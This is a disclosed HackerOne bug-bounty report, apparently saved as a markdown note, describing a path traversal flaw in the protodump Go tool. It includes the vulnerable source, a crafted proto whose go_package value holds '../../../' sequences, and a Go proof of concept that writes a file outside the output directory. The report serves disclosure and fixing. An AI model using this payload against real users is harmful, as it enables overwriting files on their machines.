---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2025-10-19
submitted: 2025-10-14T22:20:40.992Z
bounty_usd: null
votes: 56
cve: []
program: "[[programs/arkadiyt-projects|arkadiyt-projects]]"
reporter: "newby99"
source: "https://hackerone.com/reports/3384150"
title: "Arbitrary File Write"
---
# Arbitrary File Write

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 56 | **Program:** arkadiyt-projects | **Disclosed:** 2025-10-19

- Report: [https://hackerone.com/reports/3384150](https://hackerone.com/reports/3384150)
- CWE: Path Traversal
- Submitted: 2025-10-14T22:20:40.992Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi, 

Protodump contains a path traversal vulnerability that allows to write files to arbitrary locations on the filesystem outside the intended output directory. This occurs due to insufficient validation of the go_package option extracted from protobuf descriptors embedded in analyzed binaries.

The Filename() function extracts the go_package option from protobuf descriptors without sanitization:

(pkg/protodump/protodump.go)
```
func (pd *ProtoDefinition) Filename() string {
    goPackage := pd.pb.GetOptions().GetGoPackage()
    index := strings.Index(goPackage, ";")
    if index == -1 {
        return pd.descriptor.Path()
    }
    // BUG: No sanitization of goPackage path
    return path.Join(goPackage[:index], path.Base(pd.descriptor.Path()))
}
```
The goPackage value comes directly from the protobuf descriptor being analyzed and can contain path traversal sequences like ../../../

The main function uses this unsanitized filename to construct the output path:
```
filename := definition.Filename()
if strings.HasSuffix(filename, ".proto") {
    dir := path.Join(*output, path.Dir(filename))
    final := path.Join(dir, path.Base(filename))
    os.MkdirAll(dir, 0700)
    os.WriteFile(final, []byte(definition.String()), 0700)
    fmt.Printf("Wrote %s\n", final)
}
```


The attack vector is the following:
an attacker creates a binary containing a protobuf descriptor with a malicious go_package option:
```
syntax = "proto3";
package exploit;

// Malicious path traversal
option go_package = "../../../tmp/pwned;exploit";

message MaliciousMessage {
  string data = 1;
}
```

When the user runs protodump on this binary, the tool writes the extracted proto file outside the intended output directory (overriding any existing files with the same name in the target location)...
Here is a poc emulating the code:
```
package main

import (
    "fmt"
    "os"
    "path"
    "path/filepath"
    "strings"
)

func main() {
    // Get absolute path for output directory
    output, _ := filepath.Abs("./safe_output")

    // Attacker-controlled values from malicious proto
    maliciousGoPackage := "../../../tmp/pwned;exploit"
    protoName := "evil.proto"

    fmt.Println("=== Protodump Path Traversal Vulnerability PoC ===")
    fmt.Println()

    // VULNERABLE CODE: Replicate protodump's logic
    index := strings.Index(maliciousGoPackage, ";")
    var filename string
    if index == -1 {
        filename = protoName
    } else {
        filename = path.Join(maliciousGoPackage[:index], protoName)
    }

    dir := path.Join(output, path.Dir(filename))
    final := path.Join(dir, path.Base(filename))
    finalAbs, _ := filepath.Abs(final)

    fmt.Println("Configuration:")
    fmt.Printf("  Intended output: %s\n", output)
    fmt.Printf("  Malicious input: %s\n", maliciousGoPackage)
    fmt.Println()

    fmt.Println("Path Computation:")
    fmt.Printf("  filename: %s\n", filename)
    fmt.Printf("  final:    %s\n", finalAbs)
    fmt.Println()

    // Create the file
    os.MkdirAll(dir, 0755)
    content := "syntax = \"proto3\";\n\npackage exploit;\n\nmessage Pwned { string data = 1; }\n"
    os.WriteFile(final, []byte(content), 0644)

    fmt.Println("Result:")
    fmt.Printf("  Expected: %s/evil.proto\n", output)
    fmt.Printf("  Actual:   %s\n", finalAbs)
    fmt.Println()

    if !strings.HasPrefix(finalAbs, output) {
        fmt.Println("VULNERABILITY CONFIRMED: File written outside intended directory")
    }
}
```

## Impact

arbitrary file write on user's machine

**Affected Version**: Latest (commit 17ad807, verified October 2025)
**Repository**: https://github.com/arkadiyt/protodump
**Installation**: go install github.com/arkadiyt/protodump/cmd/protodump@latest

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
